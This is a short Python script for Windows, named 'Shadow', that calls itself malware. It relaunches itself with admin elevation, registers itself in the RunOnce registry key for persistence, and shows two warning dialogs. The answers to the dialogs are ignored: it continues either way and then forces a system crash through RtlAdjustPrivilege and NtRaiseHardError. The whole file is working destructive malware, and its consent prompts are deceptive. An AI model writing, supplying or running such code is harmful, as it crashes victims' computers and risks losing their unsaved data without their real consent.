import tkinter.messagebox as msgbox
import ctypes
import sys
import os
import winreg

ntdll = ctypes.windll.ntdll

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def trigger_blue():
    enabled = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))

    error_code = 0xDEADDEAD
    response = ctypes.c_uint()
    
    ntdll.NtRaiseHardError(
        error_code, 0, 0, None, 6, ctypes.byref(response)
    )

def add_to_startup():
    path = os.path.realpath(sys.argv[0])
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Shadow", 0, winreg.REG_SZ, f'python "{path}"' if path.endswith('.py') else path)
        winreg.CloseKey(key)
        print("시작 프로그램 등록 완료.")
    except Exception as e:
        print(f"등록 실패: {e}")

if __name__ == "__main__":
    if is_admin():
        add_to_startup()
        
        msgbox.askokcancel("Shadow", "This is a powerful malware. You can even lose your all data in your computer! Will you run it?")
        msgbox.askokcancel("Shadow", "LAST WARNING! I'LL NOT BE RESPONSIBLE FOR ANY ACCIDENT CAUSED BY THIS MALWARE! STILL CONTINUE?")

        trigger_blue()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

